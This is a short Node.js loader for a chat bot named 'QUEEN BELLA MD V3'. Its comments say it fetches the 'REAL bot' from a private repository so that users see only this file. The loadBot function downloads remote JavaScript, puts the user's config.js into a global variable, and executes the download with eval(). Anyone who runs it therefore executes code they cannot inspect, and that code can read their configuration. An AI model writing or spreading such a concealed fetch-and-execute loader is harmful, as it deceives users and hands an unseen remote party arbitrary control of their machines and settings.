/**
 * 👑 QUEEN BELLA MD V3 - LOADER
 * Downloads the REAL bot from private repo
 * Users ONLY see this file!
 */

const https = require('https');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

// ==========================================
// 🔒 PRIVATE REPO URL (HIDDEN FROM USERS)
// ==========================================

const BOT_URL = 'https://raw.githubusercontent.com/queenbellabots-cloud/QUEEN-BELLA-CORE/main/bot.js';

// ==========================================
// 📦 CHECK CONFIG
// ==========================================

function checkConfig() {
    try {
        const config = require('./config.js');
        if (!config.ownerNumber) {
            console.log('⚠️ Please set your ownerNumber in config.js');
            return false;
        }
        return true;
    } catch (e) {
        console.log('❌ config.js not found!');
        console.log('📝 Create config.js with your settings.');
        return false;
    }
}

// ==========================================
// 📥 DOWNLOAD AND EXECUTE
// ==========================================

function loadBot() {
    console.log('👑 Loading QUEEN BELLA MD V3...');
    console.log('🔒 This bot is protected.\n');
    
    https.get(BOT_URL, (res) => {
        let data = '';
        
        res.on('data', (chunk) => data += chunk);
        
        res.on('end', () => {
            if (data && data.length > 100) {
                console.log('✅ Bot loaded successfully!');
                console.log('🚀 Starting QUEEN BELLA MD...\n');
                
                // Pass config to the bot
                global.__config = require('./config.js');
                eval(data);
            } else {
                console.log('❌ Failed to load bot. Retrying...');
                setTimeout(loadBot, 5000);
            }
        });
        
    }).on('error', (err) => {
        console.log('❌ Error:', err.message);
        console.log('🔄 Retrying in 5 seconds...');
        setTimeout(loadBot, 5000);
    });
}

// ==========================================
// 🚀 START
// ==========================================

if (checkConfig()) {
    loadBot();
} else {
    console.log('📋 Please fix config.js and restart.');
}